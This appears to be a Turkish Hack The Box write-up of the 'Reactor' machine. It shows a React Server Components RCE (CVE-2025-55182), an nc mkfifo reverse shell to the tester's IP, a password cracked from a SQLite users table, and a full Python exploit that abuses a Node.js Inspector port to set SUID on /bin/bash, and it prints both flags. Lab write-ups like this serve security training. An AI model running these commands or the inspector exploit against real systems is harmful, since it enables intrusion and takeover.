# Reactor: Sıfır Tıklamalı Bir RCE'den Root Shell'e

**Hack The Box — Write-Up**

HTB üzerindeki **Reactor** makinesini, taze bir React tedarik zinciri açığı olan **CVE-2025-55182** üzerinden düşürdüğüm ve ardından unutulmuş bir Node.js debug portuyla root olduğum tam süreç.

`CVE-2025-55182 · CVSS 10.0` · `Next.js / React Server Components` · `Node.js Inspector Yetki Yükseltme` · `Zorluk: Kolay–Orta`

Bugün HTB'de bulunan **Reactor** makinesini çözüyoruz, umarım güzel bir yazı olur. Makine, bir nükleer santral izleme paneli teması etrafında kurulmuş; ama gerçek hikâye, bu paneli çalıştıran Next.js uygulamasında saklı.

---

## 1. Keşif: Nmap Taraması

Her sızma testinde olduğu gibi işe hedefi tanımakla başlıyorum. Makineyi başlattıktan sonra ilk adım her zaman bir `nmap` taraması:

```bash
sudo nmap -sS -sV -sC -T4 -Pn 10.129.131.97
```

Buradaki bayrakların her biri bir amaca hizmet ediyor: `-sS` gizli bir SYN taraması yapar, `-sV` açık portlardaki servislerin versiyon bilgisini çeker, `-sC` nmap'in varsayılan script setiyle ek bilgi toplar, `-T4` taramayı agresif hızda çalıştırır ve `-Pn` ile hedefin ping'e cevap vermediği durumlarda taramanın atlanmasını engellerim.

![nmap taraması: 22 ve 3000 portları açık](/blogs/img/htb-reactor-writeup/01-nmap-scan.png)
*nmap taraması — 22/tcp (ssh) ve 3000/tcp (Next.js uygulaması) açık*

Sonuçta **22** (SSH) ve **3000** (bir Next.js uygulaması) portlarının açık olduğunu görüyorum. Servis parmak izinde `X-Powered-By: Next.js` başlığı zaten hedefi ele veriyor — sonraki adımım siteyi tarayıcıda incelemek.

---

## 2. Web Uygulamasını İnceleme

3000 portuna gittiğimde karşıma **ReactorWatch** adında bir reaktör izleme paneli çıkıyor — sıcaklık, basınç, soğutucu akışı gibi canlı görünen metrikler sunan bir dashboard.

![ReactorWatch dashboard arayüzü](/blogs/img/htb-reactor-writeup/02-reactorwatch-dashboard.png)
*ReactorWatch — Core Monitoring System v3.2.1*

Sayfanın kaynak kodlarını inceliyor, birkaç dizin taraması deniyorum ama elle bir sonuç alamıyorum. Bu noktada işi otomatiğe bağlayıp `nuclei` ile bilinen açıkları taramaya karar veriyorum.

---

## 3. Zafiyet Taraması: Nuclei ile Kritik Bir Bulgu

`nuclei`, güncel CVE ve yanlış yapılandırma şablonlarını hedefe karşı otomatik olarak deneyen bir tarama aracı. Tek komutla binlerce imzalı şablonu hedefe karşı çalıştırıyorum:

```bash
nuclei -u http://10.129.131.97:3000
```

![nuclei taraması CVE-2025-55182 critical bulgusu](/blogs/img/htb-reactor-writeup/03-nuclei-scan.png)
*nuclei, hedefte CVE-2025-55182 zafiyetini "critical" olarak işaretliyor*

Tarama, **10.851** şablonu hedefe karşı deniyor ve tek bir satırla dikkatimi çekiyor: `[CVE-2025-55182] [critical]`. Bu açığın ne olduğunu bilmediğim için önce onu araştırmam gerekiyor.

---

## 4. CVE-2025-55182 Nedir? (React2Shell)

![CVE-2025-55182 kayıt sayfası](/blogs/img/htb-reactor-writeup/04-cve-2025-55182-record.png)
*CVE-2025-55182 kayıt sayfası — CNA: Meta Platforms, Inc. · CVSS 10.0 Critical*

**CVE-2025-55182**, topluluk tarafından **React2Shell** olarak da anılan, React uygulamalarının sunucu tarafında çalışan bileşenlerinde (React Server Components) bulunan, **10 üzerinden 10** puanla en yüksek risk seviyesindeki kritik bir güvenlik açığı. Resmî kayda göre açık, `react-server-dom-parcel`, `react-server-dom-turbopack` ve `react-server-dom-webpack` paketlerini de kapsayacak şekilde React Server Components 19.0.0–19.2.0 sürümlerini etkiliyor ve kimlik doğrulama gerektirmeden uzaktan kod çalıştırmaya (pre-auth RCE) izin veriyor.

> **Açığın özeti**
> - **Ne yapıyor?** Tarayıcı ile sunucu arasındaki veri alışverişini sağlayan özel protokoldeki doğrulama eksikliğinden faydalanıyor.
> - **Nasıl çalışıyor?** Saldırgan, sunucuya özel olarak hazırlanmış sahte bir istek (payload) gönderiyor; sunucu bu veriyi süzmeden doğrudan çözmeye (deserialization) çalışırken kandırılıyor.
> - **Sonucu ne?** Saldırgan hiçbir şifreye veya yetkiye ihtiyaç duymadan sunucuda dilediği kodu çalıştırabiliyor (RCE) ve sistemi tamamen ele geçirebiliyor.

Kısacası bu, sunucunun dışarıdan gelen veriyi hiç kontrol etmeden "güvenlidir" varsayımıyla doğrudan işlemesinden kaynaklanan büyük bir arka kapı açığı. Konuyu görsel olarak takip etmek isteyenler için [açığı anlatan bu videoyu](https://www.youtube.com/watch?v=YKsq4GhuWHc) da tavsiye ederim.

---

## 5. Exploit'i Temin Etme

Açık hakkında yeterli bilgi edindikten sonra sömürü aşamasına geçiyorum. Topluluk tarafından paylaşılmış hazır bir Python exploit script'i buluyor ve `wget` ile makineme indiriyorum:

![wget ile exploit script indirme](/blogs/img/htb-reactor-writeup/05-exploit-download.png)
*Exploit script'ini bir GitHub Gist üzerinden indiriyorum*

Script'in çalışma mantığı şu şekilde:

> **Hedef Belirleme:** Betiğe hedef makinenin adresini ve çalıştırmak istediğin komutu veriyorsun.
>
> **Özel İstek Oluşturma:** React uygulamasının veri işleme mekanizmasını kandırmak için HTTP isteğinin başlıklarına (headers) veya gövdesine (body) özel olarak kodlanmış zararlı bir veri (payload) yerleştiriyor.
>
> **Kod Çalıştırma (RCE):** Sunucu bu isteği aldığında, içindeki veriyi çözerken (deserialization) zararlı kodu fark edemiyor ve gönderdiğin komutu doğrudan kendi sisteminde çalıştırıyor.
>
> **Bağlantı/Çıktı:** Böylece sunucu üzerinde komut çalıştırarak ilk erişimi elde etmeni sağlıyor.

Kısacası bu betik, elle uzun uzun HTTP isteği yazmakla uğraşmamak için o karmaşık açığı tek komutla sömürmemizi sağlayan hazır bir araç.

---

## 6. RCE'yi Doğrulama

Script'i indirdikten sonra basit bir `ls` komutuyla RCE'nin gerçekten çalışıp çalışmadığını test ediyorum:

```bash
python3 CVE-2025-55182.py -t http://10.129.131.97:3000/ -c ls
```

![Exploit script'inin ls komutunu çalıştırması](/blogs/img/htb-reactor-writeup/06-rce-ls-test.png)
*Exploit başarıyla çalışıyor — çıktıda dikkat çeken bir dosya: `reactor.db`*

Başarılı bir şekilde RCE'yi doğruluyorum. Çıktıda hemen dikkatimi çeken bir şey var: `reactor.db` adında bir dosya. Ama önce kalıcı ve daha rahat çalışabileceğim bir erişim şekli olan reverse shell almam gerekiyor.

---

## 7. Reverse Shell Hazırlığı

Artık gerisi çok kolay — reverse shell alıp makineye sızacağım. Bunun için hazır bir reverse shell komutuna ihtiyacım var; bunu [revshell.com](https://www.revshell.com) üzerinden oluşturabiliyorum. Kendi IP'mi, dinleyeceğim portu ve kabuk tipini (`nc mkfifo`) seçip hazır komutu alıyorum.

![revshell.com ile nc mkfifo reverse shell komutu](/blogs/img/htb-reactor-writeup/07-revshell-generator.png)
*revshell.com — IP, port ve `nc mkfifo` yöntemiyle hazır reverse shell komutu*

## 8. Reverse Shell Komutunu Gönderme

Oluşturduğum reverse shell komutunu, az önce RCE için kullandığım aynı exploit script'inin `-c` parametresine veriyorum. Böylece hedef sunucu, benim dinlediğim porta kendi bağlanacak:

```bash
python3 CVE-2025-55182.py -t http://10.129.131.97:3000/ \
    -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.168 5858 >/tmp/f"
```

![Reverse shell komutunun hedefe gönderilmesi](/blogs/img/htb-reactor-writeup/08-reverse-shell-payload.png)
*Reverse shell payload'ı hedefe gönderiliyor*

---

## 9. Bağlantıyı Yakalama

Komutu göndermeden önce kendi makinemde ilgili portu dinlemeye alıyorum:

```bash
nc -lvnp 5858
```

![netcat listener'da bağlantının gelmesi](/blogs/img/htb-reactor-writeup/09-netcat-catch.png)
*Bağlantı geliyor — `whoami` çıktısı: **node***

Bağlantı geliyor ve karşımda bir shell var. `whoami` ile kontrol ettiğimde **node** kullanıcısı olarak sisteme girdiğimi görüyorum. Artık sistemde keşif yapma vakti.

---

## 10. Sistemde Keşif: reactor.db'yi Bulmak

Uygulama dizinine geçip etraftakileri inceliyorum. Az önce exploit testinde de gördüğüm `reactor.db` dosyası burada duruyor — içinde önemli bilgiler olup olmadığını kontrol etmem gerekiyor. Önce hedefte SQLite'ın kurulu olup olmadığına bakıyorum:

```bash
ls -la
which sqlite
which sqlite3
```

![ls -la ve which sqlite3 çıktısı](/blogs/img/htb-reactor-writeup/10-reactor-db-discovery.png)
*`sqlite3` hedefte kurulu — `reactor.db` içinde `sensor_logs` ve `users` tabloları var*

`/usr/bin/sqlite3` hedefte kurulu çıkıyor. Veritabanını sorguladığımda **sensor_logs** ve **users** adında iki tablo görüyorum. `users` tablosu tam da aradığım şey — burada credential bulabileceğimi düşünüyorum, ve öyle de oluyor.

---

## 11. Veritabanından Credential Çalma

`users` tablosunun tüm satırlarını çekiyorum:

```bash
sqlite3 reactor.db "SELECT * FROM users;"
```

![users tablosu hash değerleri](/blogs/img/htb-reactor-writeup/11-users-table-dump.png)
*`administrator` ve `engineer` kullanıcılarının parola hash'leri ele geçiyor*

**administrator** ve **engineer** kullanıcılarının hash değerlerini buluyorum. Hash'i bir çözücüye verdiğimde, **engineer** kullanıcısının şifresinin `reactor1` olduğunu tespit ediyorum.

```bash
su engineer
Password: reactor1
```

![su engineer ile geçiş](/blogs/img/htb-reactor-writeup/12-su-engineer.png)
*Kırılan parola ile `engineer` kullanıcısına geçiyorum*

---

## 12. User Flag

`engineer` kullanıcısı olarak sisteme erişince ilk hedefim olan user flag'i alıyorum:

```bash
cat user.txt
```

![user.txt flag'inin okunması](/blogs/img/htb-reactor-writeup/13-user-flag.png)
*user.txt ele geçti*

**USER FLAG:** `39eb90cc324cf7e9fd1590c9351c02a0`

---

## 13. Privilege Escalation: Açık Portları Tarama

Sırada yetki yükseltme (privilege escalation) var. `engineer` kullanıcısının sudo yetkilerini kontrol ediyorum ama bir şey yok; SUID bitli dosyalara bakıyorum, onlarla ilgili de bir şey bulamıyorum. Bunun üzerine dışa kapalı ama iç ağda dinleyen portlar olup olmadığını kontrol etmeye karar veriyorum:

```bash
ss -tunlp
```

![ss -tunlp çıktısında 9229 portu](/blogs/img/htb-reactor-writeup/14-ss-tunlp-node-inspector.png)
*`127.0.0.1:9229` üzerinde bir Node.js Inspector servisi dinliyor*

Çıktıda `127.0.0.1:9229` portunda çalışan bir **Node.js Inspector** servisi görüyorum. Bu port normalde geliştiricilerin uygulamalarında hata ayıklaması (debug) içindir, ama doğru kullanıldığında yetki yükseltmek için işime yarayabilir. Servisin verdiği bilgiyi almak için yerelde bir `curl` isteği atıyorum:

```bash
curl -s http://127.0.0.1:9229/json
```

Dönen JSON içinde bir `webSocketDebuggerUrl` ve buna bağlı benzersiz bir UUID görüyorum — inspector'a bağlanmak için tam olarak bu yol lazım.

---

## 14. Node.js Inspector Protokolünü Sömürme

Dışarıdan ekstra bir kütüphane kuramayacağım için Python'un kendi içindeki soket (socket) özelliklerini kullanarak bu gizli adrese bağlanan bir mini script yazıp sistemi kandırmaya çalışmaya karar veriyorum. Script'in mantığı şöyle: önce Node Inspector'ın konuştuğu protokol olan WebSocket için elle bir el sıkışma (handshake) isteği gönderiyor, ardından WebSocket çerçeveleme (framing) kurallarına uygun bir mesaj paketleyip Inspector'ın `Runtime.evaluate` metoduna, çalıştırılacak Node.js kodunu `expression` olarak veriyorum. Gönderdiğim ifade de `child_process.execSync` ile `/bin/bash` dosyasına SUID biti ekliyor. Bu betiği yazarken kütüphane kısıtı nedeniyle protokolü elle inşa etmem gerektiği için yapay zekâdan da yardım aldım:

```python
import socket
import base64
import os
import json

host = "127.0.0.1"
port = 9229
path = "/cdd805ec-6472-40a1-9f64-e01b1d999ffc"  # Kendi URL'nizdeki UUID'yi buraya yazın

# WebSocket anahtarı oluştur
key = base64.b64encode(os.urandom(16)).decode('utf-8')

# Ham TCP soketi ile bağlantı kur
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# WebSocket El Sıkışma (Handshake) isteği gönder
handshake = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Upgrade: websocket\r\n"
    f"Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    f"Sec-WebSocket-Version: 13\r\n\r\n"
)
s.sendall(handshake.encode())
response = s.recv(1024)

# WebSocket çerçeveleme (framing) fonksiyonu
def send_ws_frame(sock, message):
    data = message.encode('utf-8')
    length = len(data)
    frame = bytearray()
    frame.append(0x81)  # Text frame, FIN bit set
    if length <= 125:
        frame.append(0x80 | length)  # Masking bit set (0x80)
    elif length <= 65535:
        frame.append(0x80 | 126)
        frame.extend(length.to_bytes(2, 'big'))
    else:
        frame.append(0x80 | 127)
        frame.extend(length.to_bytes(8, 'big'))
    mask_key = os.urandom(4)
    frame.extend(mask_key)
    masked_data = bytearray(data)
    for i in range(length):
        masked_data[i] ^= mask_key[i % 4]
    frame.extend(masked_data)
    sock.sendall(frame)

# Root yetkisiyle /bin/bash dosyasına SUID veren komut payload'ı
payload = {
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": "process.mainModule.require('child_process').execSync('chmod u+s /bin/bash').toString()"
    }
}

send_ws_frame(s, json.dumps(payload))
print("[+] Komut başarıyla gönderildi! /bin/bash SUID yetkisi aldı.")
s.close()
```

Script'i hedefte oluşturup çalıştırıyorum — böylece sisteme "bana `/bin/bash` dosyasına özel yetki ver" demiş oluyorum:

```bash
nano root.py
python3 root.py
# [+] Komut başarıyla gönderildi! /bin/bash SUID yetkisi aldı.
bash -p
```

![root.py çalıştırılması, whoami: root](/blogs/img/htb-reactor-writeup/15-root-exploit-run.png)
*Script başarıyla çalışıyor — `bash -p` ile artık **root**um*

---

## 15. Root Flag

Ve başarılı bir şekilde root olup son bayrağımızı da alıyoruz:

```bash
cat root.txt
```

![root.txt flag'inin okunması](/blogs/img/htb-reactor-writeup/16-root-flag.png)
*root.txt ele geçti — makine tamamlandı*

**ROOT FLAG:** `95de3de01554ca23de1f77137f9f0610`

---

## 16. Sonuç

Reactor, güncel ve gerçek dünyada henüz taze olan bir tedarik zinciri açığı olan CVE-2025-55182 üzerinden başlayıp, veritabanında unutulmuş bir parola hash'i ve production ortamında açık bırakılmış bir Node.js debug portuyla root'a uzanan keyifli bir zincirdi. Beni en çok şaşırtan kısım, `9229` portunun ne kadar sık unutulan ama o kadar da güçlü bir yetki yükseltme vektörü olabildiğiydi.

Bir sonraki yazımda görüşmek üzere.
